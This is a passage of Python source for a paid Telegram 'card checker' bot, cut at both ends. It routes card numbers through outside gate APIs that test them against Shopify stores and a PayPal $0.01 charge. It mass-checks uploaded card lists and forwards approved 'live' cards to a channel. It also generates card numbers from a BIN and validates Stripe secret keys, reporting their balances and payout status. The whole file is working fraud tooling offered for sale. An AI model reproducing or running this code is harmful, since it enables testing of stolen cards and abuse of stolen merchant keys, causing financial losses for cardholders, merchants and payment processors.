        f"[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...  \n"
        f"[↯] 𝑮𝑨𝑻𝑬 ↯ 𝑺𝑯𝑶𝑷𝑰𝑭𝒀  \n"
        f"[↯] 𝑨𝑴𝑶𝑼𝑵𝑻 ↯ 5.00$  \n"
        f"━━━━━━━━━━━━━━━━━━━",
        reply_to_message_id=msg.message_id
    )

    start_time = time.time()
    try:
        api_url = f"{SH_URL}?cc={cc}&site=http://the-carolina-trader.myshopify.com"
        response = requests.get(api_url, timeout=30).json()

        cc_val = response.get("cc", cc)
        gateway = response.get("Gateway", "N/A")
        result = response.get("Response", "N/A")
        price = response.get("Price", "N/A")

        result_status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" if any(k.lower() in result.lower() for k in APPROVED_KEYWORDS) else "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"

        # BIN lookup
        bin_data = requests.get(f"{BIN_URL}{cc[:6]}", timeout=10).json()
        bank = bin_data.get("bank", "N/A")
        brand = f"{bin_data.get('brand', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('brand', 'N/A')}"
        level = bin_data.get("level", "N/A")
        country = bin_data.get("country_name", "N/A")
        currency = ', '.join(bin_data.get("country_currencies", ["N/A"]))

        taken = f"{time.time() - start_time:.2f}s"

        final_msg = (
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖 ↯ {cc_val}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗦 ↯ {gateway} : {price}💲\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {result_status}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯ {result}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ↯ {bank}\n"
            f"[↯] 𝗕𝗿𝗮𝗻𝗱 ↯ {brand}\n"
            f"[↯] 𝗟𝗲𝘃𝗲𝗹 ↯ {level}\n"
            f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ {country}\n"
            f"[↯] 𝗖𝘂𝗿𝗿𝗲𝗻𝘤𝘆 ↯ {currency}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 ↯ {taken}\n"
            f"[↯] 𝗨𝘀𝗲𝗿 ↯ {name}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )

        processing_msg.delete()
        msg.reply_text(final_msg, reply_to_message_id=msg.message_id)

        if "approved" in result.lower() or any(k.lower() in result.lower() for k in APPROVED_KEYWORDS):
            forward_live_card(context.bot, final_msg)

    except Exception as e:
        processing_msg.delete()
        msg.reply_text(f"❌ Error while checking card: {e}", reply_to_message_id=msg.message_id)
      

def generate_cc(base):
    missing = 16 - len(base)
    body = base + ''.join(str(random.randint(0, 9)) for _ in range(missing - 1))
    return body + str(random.randint(0, 9))

def is_amex(bin6):
    return bin6.startswith("34") or bin6.startswith("37")

def gen_command(update: Update, context: CallbackContext):
    msg = update.message
    user_input = ' '.join(context.args).replace(' ', '')

    if not user_input:
        msg.reply_text("✦ Please provide BIN or partial CC format to generate.")
        return

    # Extract parts
    cc_part, mm, yy = "xxxxxxxxxxxxxxxx", "09", "2029"
    cvv_length = 3

    parts = user_input.split("|")
    if len(parts) == 1:
        cc_part = parts[0]
    elif len(parts) == 2:
        cc_part, mm = parts
    elif len(parts) == 3:
        cc_part, mm, yy = parts
    elif len(parts) == 4:
        cc_part, mm, yy, _ = parts  # ignore CVV if given

    # Pad cc_part if only 6-digit bin provided
    cc_part = cc_part.replace("x", "")
    if len(cc_part) < 6:
        msg.reply_text("✦ Invalid BIN. Please enter at least 6-digit BIN or partial CC.")
        return

    bin_lookup = requests.get(f"{BIN_URL}{cc_part[:6]}").json()
    country = bin_lookup.get("country_name", "N/A")
    brand_raw = bin_lookup.get("brand", "N/A")
    brand = f"{brand_raw} - {bin_lookup.get('type', 'N/A')} - {bin_lookup.get('category', 'N/A')}"
    level = bin_lookup.get("level", "N/A")
    currency = ', '.join(bin_lookup.get("country_currencies", ["N/A"]))

    is_amex_card = is_amex(cc_part[:6])
    cvv_length = 4 if is_amex_card else 3

    # Generate 10 cards
    cc_list = []
    for _ in range(10):
        cc_num = generate_cc(cc_part)
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
        cc_list.append(f"`{cc_num}|{mm}|{yy}|{cvv}`")

    msg_text = (
    f"━━━━━━━━━━━━━━━━━━━\n"
    f"[↯] 𝑩𝑰𝑵 ↯ {cc_part[:6]}\n"
    f"[↯] 𝑻𝑶𝑻𝑨𝑳 ↯ 10 𝑮𝑬𝑵𝑬𝑹𝑨𝑻𝑬𝑫\n\n"
    + '\n'.join(cc_list) + "\n\n"
    f"[↯] 𝑪𝑶𝑼𝑵𝑻𝑹𝒀 ↯ {country}\n"
    f"[↯] 𝑩𝑹𝑨𝑵𝑫 ↯ {brand}\n"
    f"[↯] 𝑳𝑬𝑽𝑬𝑳 ↯ {level}\n"
    f"[↯] 𝑪𝑼𝑹𝑹𝑬𝑵𝑪𝒀 ↯ {currency}\n"
    f"━━━━━━━━━━━━━━━━━━━"
)

    msg.reply_text(msg_text)
    

def check_sk_key(sk_key):
    headers = {
        "Authorization": f"Bearer {sk_key}"
    }

    try:
        start = time.time()

        # Hit balance endpoint to validate key
        balance_resp = requests.get("https://api.stripe.com/v1/balance", headers=headers)
        status = "Valid ✅" if balance_resp.status_code == 200 else "Dead ❌"

        if balance_resp.status_code != 200:
            return {
                "sk": sk_key,
                "status": status,
                "time": f"{time.time() - start:.2f}s"
            }

        balance_data = balance_resp.json()
        available = balance_data["available"][0]["amount"] / 100
        pending = balance_data["pending"][0]["amount"] / 100
        currency = balance_data["available"][0]["currency"].upper()

        # Hit account endpoint
        acct_resp = requests.get("https://api.stripe.com/v1/account", headers=headers)
        acct = acct_resp.json()

        return {
            "sk": sk_key,
            "status": status,
            "mode": "Live Mode 🔥" if "live" in sk_key else "Test Mode",
            "integration": "Active ✅" if acct.get("charges_enabled") else "Inactive ❌",
            "account_type": acct.get("business_type", "N/A").capitalize(),
            "country": acct.get("country", "N/A"),
            "currency": currency,
            "capabilities": acct.get("capabilities", {}),
            "charges_enabled": "Yes ✅" if acct.get("charges_enabled") else "No ❌",
            "payouts_enabled": "Yes ✅" if acct.get("payouts_enabled") else "No ❌",
            "transfers": acct.get("transfers_enabled", "N/A"),
            "available": f"{available} {currency}",
            "pending": f"{pending} {currency}",
            "time": f"{time.time() - start:.2f}s"
        }

    except Exception as e:
        return {"sk": sk_key, "status": "Error", "error": str(e)}

# /sk Command Handler
def sk_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user

    args = msg.text.split()
    if len(args) < 2:
        msg.reply_text("✦ Please provide a valid sk key.\n\nExample:\n`/sk sk_live_xxx`", parse_mode="Markdown")
        return

    sk_key = args[1].strip()
    result = check_sk_key(sk_key)

    if result.get("status") != "Valid ✅":
        msg.reply_text(
            f"𝗦𝗞 𝗞𝗲𝘆 ↯ {result['sk']}\n"
            f"𝐒𝐭𝐚𝐭𝐮𝐬 ↯ {result['status']}\n"
            f"𝐓𝐢𝐦𝐞 ↯ {result.get('time', 'N/A')}\n"
            f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ↯ @{user.username or user.first_name}",
            parse_mode="Markdown"
        )
        return

    capabilities = result.get("capabilities", {})
    card = capabilities.get("card_payments", "N/A").capitalize()
    transfers = result.get("transfers", "N/A").capitalize()

    msg.reply_text(
    f"[↯] 𝑺𝑲 𝑲𝑬𝒀 ↯ {result['sk']}\n"
    f"[↯] 𝑺𝑻𝑨𝑻𝑼𝑺  ↯ {result['status']}\n"
    f"[↯] 𝑴𝑶𝑫𝑬  ↯ {result['mode']}\n\n"

    f"[↯] 𝑰𝑵𝑻𝑬𝑮𝑹𝑨𝑻𝑰𝑶𝑵  ↯ {result['integration']}\n"
    f"[↯] 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 𝑻𝒀𝑷𝑬  ↯ {result['account_type']}\n"
    f"[↯] 𝑪𝑶𝑼𝑵𝑻𝑹𝒀  ↯ {result['country']}\n"
    f"[↯] 𝑪𝑼𝑹𝑹𝑬𝑵𝑪𝒀  ↯ {result['currency']}\n\n"

    f"[↯] 𝑪𝑨𝑷𝑨𝑩𝑰𝑳𝑰𝑻𝑰𝑬𝑺 ↯\n"
    f"[↯] 𝑪𝑨𝑹𝑫 𝑷𝑨𝒀𝑴𝑬𝑵𝑻𝑺  ↯ {card}\n"
    f"[↯] 𝑻𝑹𝑨𝑵𝑺𝑭𝑬𝑹𝑺  ↯ {transfers}\n"
    f"[↯] 𝑪𝑯𝑨𝑹𝑮𝑬𝑺 𝑬𝑵𝑨𝑩𝑳𝑬𝑫  ↯ {result['charges_enabled']}\n"
    f"[↯] 𝑷𝑨𝒀𝑶𝑼𝑻𝑺 𝑬𝑵𝑨𝑩𝑳𝑬𝑫  ↯ {result['payouts_enabled']}\n\n"

    f"[↯] 𝑩𝑨𝑳𝑨𝑵𝑪𝑬 ↯\n"
    f"[↯] 𝑨𝑽𝑨𝑰𝑳𝑨𝑩𝑳𝑬  ↯ {result['available']}\n"
    f"[↯] 𝑷𝑬𝑵𝑫𝑰𝑵𝑮   ↯ {result['pending']}\n\n"

    f"[↯] 𝑻𝑰𝑴𝑬  ↯ {result['time']}\n"
    f"[↯] 𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀  ↯ @{user.username or user.first_name}",
)
        
        
def info_command(update: Update, context: CallbackContext):
    user = update.message.from_user
    user_id = str(user.id)
    username = f"@{user.username}" if user.username else "N/A"
    name = user.first_name

    # Read user registration info
    with open("Data/Users.json", "r") as f:
        users = json.load(f)
    reg_date = users.get(user_id, {}).get("date", "N/A")

    # Check plan
    try:
        with open("Data/plan.json", "r") as f:
            plans = json.load(f)
        plan_info = plans.get(user_id)
        plan = "PREMIUM" if plan_info else "FREE"
    except:
        plan = "FREE"

    msg = (
        "✦ 𝑼𝑺𝑬𝑹 𝑰𝑵𝑭𝑶 ✦\n\n"
        f"⟡ 𝑵𝑨𝑴𝑬   ↯ {name}\n"
        f"⟡ 𝑼𝑺𝑬𝑹     ↯ {username}\n"
        f"⟡ 𝑼𝑺𝑬𝑹 𝑰𝑫  ↯ {user_id}\n"
        f"⟡ 𝑷𝑳𝑨𝑵    ↯ {plan}\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

    update.message.reply_text(msg)






def add_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user
    user_id = str(user.id)

    args = context.args
    if not args:
        msg.reply_text("✦ 𝑺𝑰𝑻𝑬 𝑨𝑫𝑫 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑼𝑹𝑳 𝑴𝑰𝑺𝑺𝑰𝑵𝑮 \n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /add site-url-here  \n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/add https://dorksofthunder.com`\n━━━━━━━━━━━━━━━━━━━", parse_mode="Markdown")
        return

    new_site = args[0]
    if not new_site.startswith("http"):
        msg.reply_text("✦ 𝑺𝑰𝑻𝑬 𝑨𝑫𝑫 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑼𝑹𝑳 \n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /add site-url-here  \n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/add https://dorksofthunder.com`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    # Load or create site data
    try:
        with open(SITE_FILE, "r") as f:
            sites = json.load(f)
    except FileNotFoundError:
        sites = {}

    # Update user site (overwrite if exists)
    sites[user_id] = new_site
    with open(SITE_FILE, "w") as f:
        json.dump(sites, f, indent=4)

    # Send confirmation message
    msg.reply_text(
        f"✦ 𝑺𝑰𝑻𝑬 𝑨𝑫𝑫 ✦\n\n"
        f"⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑺𝑼𝑪𝑪𝑬𝑺𝑺\n"
        f"⟡ 𝑺𝑰𝑻𝑬 ↯ `{new_site}`\n\n"
        f"⟡ 𝑵𝑶𝑾 𝒀𝑶𝑼 𝑪𝑨𝑵 𝑼𝑺𝑬 `/sh` 𝑪𝑶𝑴𝑴𝑨𝑵𝑫\n"
        f"⟡ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑪𝑶𝑴𝑴𝑨𝑵𝑫 ↯ `/msh`",
        parse_mode="Markdown"
    )
    
def sh_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user
    user_id = str(user.id)
    name = user.first_name
    text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = extract_cc(text)

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /sh cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/sh 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    # Plan check
    if not has_active_plan(user_id):
        buttons = [[InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾 ⟡", url="https://t.me/hacxie")]]
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦ \n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌\n"
            "⟡ 𝑷𝑳𝑨𝑵 ↯ 𝑵𝑶𝑵𝑬\n"
            "⟡ 𝑬𝑿𝑷𝑰𝑹𝒀 ↯ 𝑵/𝑨\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    # Site check
    sites = load_json(SITE_FILE)
    site = sites.get(user_id)
    if not site:
        msg.reply_text(
            "✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶 𝑺𝑰𝑻𝑬 𝑭𝑶𝑼𝑵𝑫  \n"
            "⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝒀𝑶𝑼 𝑯𝑨𝑽𝑬𝑵'𝑻 𝑨𝑫𝑫𝑬𝑫 𝑨𝑵𝒀 𝑺𝑰𝑻𝑬  \n"
            "⟡ 𝑪𝑴𝑫 ↯ 𝑼𝑺𝑬 /add site-url-here  \n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        return

    processing = msg.reply_text(
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺\n\n"
        f"[↯] 𝑪𝑪 ↯ {cc}\n"
        f"[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□\n"
        f"[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...\n"
        f"[↯] 𝑮𝑨𝑻𝑬 ↯ 𝑨𝑼𝑻𝑶 𝑺𝑯𝑶𝑷𝑰𝑭𝒀\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )

    try:
        start = time.time()
        r = requests.get(f"{SHOPIFY_API}?cc={cc}&site={site}", timeout=30)
        res = r.json()

        response = res.get("Response", "N/A")
        gateway = res.get("Gateway", "N/A")
        price = res.get("Price", "N/A")
        result_status = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" if any(k in response for k in APPROVED_KEYWORDS) else "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"

        # BIN lookup
        bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc[:6]}").json()
        bank = bin_data.get("bank", "N/A")
        brand = f"{bin_data.get('brand', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('brand', 'N/A')}"
        level = bin_data.get("level", "N/A")
        country = bin_data.get("country_name", "N/A")
        currency = ', '.join(bin_data.get("country_currencies", ["N/A"]))

        taken = round(time.time() - start, 2)

        final = (
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗖𝗖 ↯ {cc}\n"
            f"[↯] 𝗚𝗔𝗧𝗘𝗦 ↯ {gateway} : {price}💲\n"
            f"[↯] 𝗦𝗶𝘁𝗲 ↯ 1\n"
            f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧 ↯ {result_status}\n"
            f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ↯ {response}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗕𝗮𝗻𝗸 ↯ {bank}\n"
            f"[↯] 𝗕𝗿𝗮𝗻𝗱 ↯ {brand}\n"
            f"[↯] 𝗟𝗲𝘃𝗲𝗹 ↯ {level}\n"
            f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ↯ {country}\n"
            f"[↯] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 ↯ {currency}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"[↯] 𝗧𝗶𝗺𝗲 ↯ {taken}s\n"
            f"[↯] 𝗨𝘀𝗲𝗿 ↯ {name}\n"
            f"━━━━━━━━━━━━━━━━━━━"
        )

        processing.delete()
        msg.reply_text(final)

        if "approved" in response.lower() or any(k.lower() in response.lower() for k in APPROVED_KEYWORDS):
            forward_live_card(context.bot, final)

    except Exception as e:
           try:
              processing.delete()
           except:
                  pass

           bank = bank if 'bank' in locals() else "N/A"
           brand = brand if 'brand' in locals() else "N/A"
           level = level if 'level' in locals() else "N/A"
           country = country if 'country' in locals() else "N/A"
           currency = currency if 'currency' in locals() else "N/A"
           takens = round(time.time() - start, 2)
           name = name if 'name' in locals() else "N/A"

    msg.reply_text(
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗖𝗖: {cc}\n"
        f"[↯] 𝗚𝗔𝗧𝗘𝗦: 𝑵/𝑨 : 𝑵/𝑨 💲\n"
        f"[↯] 𝗥𝗘𝗦𝗨𝗟𝗧: 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌\n"
        f"[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 𝑨𝑷𝑰 𝑬𝑹𝑹𝑶𝑹 𝑹𝑬𝑪𝑯𝑬𝑪𝑲\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗕𝗮𝗻𝗸 ⇾ {bank}\n"
        f"[↯] 𝗕𝗿𝗮𝗻𝗱 ⇾ {brand}\n"
        f"[↯] 𝗟𝗲𝘃𝗲𝗹 ⇾ {level}\n"
        f"[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country}\n"
        f"[↯] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 ⇾ {currency}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"[↯] 𝗧𝗶𝗺𝗲 : {takens}s\n"
        f"[↯] 𝗨𝘀𝗲𝗿: {name}\n"
        f"━━━━━━━━━━━━━━━━━━━",
        reply_to_message_id=msg.message_id
    )
        
        
def msh_command(update: Update, context: CallbackContext):
    msg = update.message

    user = msg.from_user
    user_id = str(user.id)
    name = user.first_name

    if not has_active_plan(user_id):
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌\n"
            "⟡ 𝑷𝑳𝑨𝑵 ↯ 𝑵𝑶𝑵𝑬\n"
            "⟡ 𝑬𝑿𝑷𝑰𝑹𝒀  ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⟡ 𝑩𝑼𝒀 𝑵𝑶𝑾 ⟡", url="https://t.me/hacxie")]
            ])
        )
        return

    try:
        with open("Data/sites.json", "r") as f:
            sites = json.load(f)
        site = sites.get(user_id)
        if not site:
            raise Exception()
    except:
        msg.reply_text(
            "✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶 𝑺𝑰𝑻𝑬 𝑭𝑶𝑼𝑵𝑫  \n"
            "⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝒀𝑶𝑼 𝑯𝑨𝑽𝑬𝑵'𝑻 𝑨𝑫𝑫𝑬𝑫 𝑨𝑵𝒀 𝑺𝑰𝑻𝑬  \n"
            "⟡ 𝑪𝑴𝑫 ↯ 𝑼𝑺𝑬 /add site-url-here  \n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        return

    if not msg.reply_to_message or not msg.reply_to_message.document:
        msg.reply_text("✦ 𝑰𝑵𝑷𝑼𝑻 𝑹𝑬𝑸𝑼𝑰𝑹𝑬𝑫 ✦\n\n⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑹𝑬𝑷𝑳𝒀 𝑾𝑰𝑻𝑯 𝑨 .txt 𝑭𝑰𝑳𝑬 \n⟡ 𝑭𝑰𝑳𝑬 𝑺𝑯𝑶𝑼𝑳𝑫 𝑪𝑶𝑵𝑻𝑨𝑰𝑵 𝑪𝑪 𝑰𝑵 cc|mm|yy|cvv 𝑭𝑶𝑹𝑴𝑨𝑻 \n━━━━━━━━━━━━━━━━━━━")
        return

    file = msg.reply_to_message.document.get_file()
    content = file.download_as_bytearray().decode("utf-8", errors="ignore")
    lines = content.strip().splitlines()
    all_ccs = [cc for cc in lines if extract_cc(cc)]
    total = len(all_ccs)

    if total == 0:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑵𝑶 𝑽𝑨𝑳𝑰𝑫 𝑪𝑪 𝑭𝑶𝑼𝑵𝑫\n━━━━━━━━━━━━━━━━━━━\n")
        return

    limit = 100
    to_check = all_ccs[:limit]
    processing_msg = msg.reply_text(
        f"✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ✦\n\n"
        f"⟡ 𝑻𝑶𝑻𝑨𝑳  ↯ {total}\n"
        f"⟡ 𝑪𝑯𝑬𝑪𝑲𝑰𝑵𝑮 ↯ {len(to_check)} (𝑳𝑰𝑴𝑰𝑻 𝑰𝑺 100 𝑪𝑪 𝑶𝑵𝑳𝒀  )\n"
        f"⟡ 𝑮𝑨𝑻𝑬   ↯ 𝑨𝑼𝑻𝑶 𝑺𝑯𝑶𝑷𝑰𝑭𝒀\n"
        f"⟡ 𝑷𝑳𝑬𝑨𝑺𝑬 𝑾𝑨𝑰𝑻...... \n "
        f"━━━━━━━━━━━━━━━━━━━"
    )

    result_lines = []
    approved = declined = 0
    start = time.time()

    for cc in to_check:
        cc_clean = extract_cc(cc)
        try:
            r = requests.get(f"http://kamalxd.com/Dark/shpy.php?cc={cc_clean}&site={site}", timeout=30)
            res = r.json()
            response = res.get("Response", "N/A")
            status = "APPROVED" if any(k.lower() in response.lower() for k in APPROVED_KEYWORDS) else "DECLINED"
            result_lines.append(f"{cc_clean} | {status} | {response}")

            if status == "APPROVED":
                approved += 1
                forward_live_card(context.bot, f"`{cc_clean}` | ✅ {response}")
            else:
                declined += 1
        except Exception as e:
            result_lines.append(f"{cc_clean} | ERROR | {str(e)}")
            declined += 1

    filename = f"msh_result_{user_id}.txt"
    with open(filename, "w") as f:
        f.write("\n".join(result_lines))

    total_time = round(time.time() - start, 2)
    caption = (
        f"✦ 𝑴𝑨𝑺𝑺 𝑪𝑯𝑬𝑪𝑲 𝑹𝑬𝑺𝑼𝑳𝑻 ✦\n\n"
        f"⟡ 𝑻𝑶𝑻𝑨𝑳   ↯ {len(to_check)}\n"
        f"⟡ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫 ↯ {approved}\n"
        f"⟡ 𝑫𝑬𝑪𝑳𝑰𝑵𝑬𝑫  ↯ {declined}\n"
        f"⟡ 𝑻𝑰𝑴𝑬 ↯ {total_time}s\n"
        f"⟡ 𝑮𝑨𝑻𝑬   ↯ 𝑨𝑼𝑻𝑶 𝑺𝑯𝑶𝑷𝑰𝑭𝒀\n"
        f"⟡ 𝑪𝑯𝑬𝑪𝑲𝑬𝑫 𝑩𝒀 ↯ {name}\n"
        f"━━━━━━━━━━━━━━━━━━━ \n"
    )

    try:
        with open(filename, "rb") as doc:
            context.bot.send_document(chat_id=msg.chat_id, document=InputFile(doc), caption=caption)
        os.remove(filename)  # Delete after successful delivery
    except Exception as e:
        msg.reply_text(f"❌ Failed to send result file.\n{e}")

    try:
        context.bot.delete_message(chat_id=msg.chat_id, message_id=processing_msg.message_id)
    except:
        pass
    
    
def pp_command(update: Update, context: CallbackContext):
    msg = update.message
    user = msg.from_user

    user_id = str(user.id)
    name = user.first_name
    cc_text = msg.text or (msg.reply_to_message.text if msg.reply_to_message else "")
    cc = extract_cc(cc_text)

    if not cc:
        msg.reply_text("✦ 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 ✦\n\n⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑭𝑨𝑰𝑳𝑬𝑫 \n⟡ 𝑹𝑬𝑨𝑺𝑶𝑵 ↯ 𝑰𝑵𝑽𝑨𝑳𝑰𝑫 𝑪𝑨𝑹𝑫 𝑭𝑶𝑹𝑴𝑨𝑻\n⟡ 𝑼𝑺𝑨𝑮𝑬 ↯ /pp cc|mm|yy|cvv\n⟡ 𝑬𝑿𝑨𝑴𝑷𝑳𝑬 ↯ `/pp 5154620057263731|04|29|674`\n━━━━━━━━━━━━━━━━━━━\n", parse_mode="Markdown")
        return

    if not has_active_plan(user_id):
        buttons = [[InlineKeyboardButton("⟡ BUY PLAN ⟡", url="https://t.me/hacxie")]]
        msg.reply_text(
            "✦ 𝑵𝑶 𝑨𝑪𝑻𝑰𝑽𝑬 𝑷𝑳𝑨𝑵 ✦\n\n"
            "⟡ 𝑺𝑻𝑨𝑻𝑼𝑺 ↯ 𝑵𝑶𝑻 𝑨𝑪𝑻𝑰𝑽𝑬 ❌\n"
            "⟡ 𝑷𝑳𝑨𝑵 ↯ 𝑵𝑶𝑵𝑬\n"
            "⟡ 𝑬𝑿𝑷𝑰𝑹𝒀 ↯ 𝑵/𝑨\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return

    processing = msg.reply_text(
        "━━━━━━━━━━━━━━━━━━━\n"
        "[↯] 𝑪𝑨𝑹𝑫 𝑪𝑯𝑬𝑪𝑲 𝑺𝑻𝑨𝑻𝑼𝑺\n\n"
        f"[↯] 𝑪𝑪 ↯ {cc}\n"
        "[↯] 𝑺𝒕𝒂𝒕𝒖𝒔 ↯ 𝑷𝒓𝒐𝒄𝒆𝒔𝒔𝒊𝒏𝒈 ∎∎∎□□\n"
        "[↯] 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕, 𝒕𝒉𝒊𝒔 𝒎𝒂𝒚 𝒕𝒂𝒌𝒆 𝒔𝒐𝒎𝒆 𝒕𝒊𝒎𝒆...\n"
        "[↯] 𝑮𝑨𝑻𝑬 ↯  𝑷𝑨𝒀𝑷𝑨𝑳 𝑫𝑰𝑹𝑬𝑪𝑻 0.01$\n"
        "━━━━━━━━━━━━━━━━━━━"
    )

    start_time = time.time()

    try:
        response = requests.get(f"https://proxkamal.com/kamal/pp.php?lista={cc}", timeout=30).json()

        status = response.get("status", "Unknown")
        card = response.get("card", cc)
        gateway = response.get("gateway", "PayPal Direct $0.01")
        response_msg = response.get("response_message", "No response")
        time_taken = response.get("time_taken", f"{time.time() - start_time:.2f}s")

        bin_info = response.get("bin_info", {})
        bank = bin_info.get("bank", "N/A")
        brand = bin_info.get("brand", "N/A")
        level = bin_info.get("level", "N/A")
        ctype = bin_info.get("type", "N/A")
        country = bin_info.get("country", "N/A")

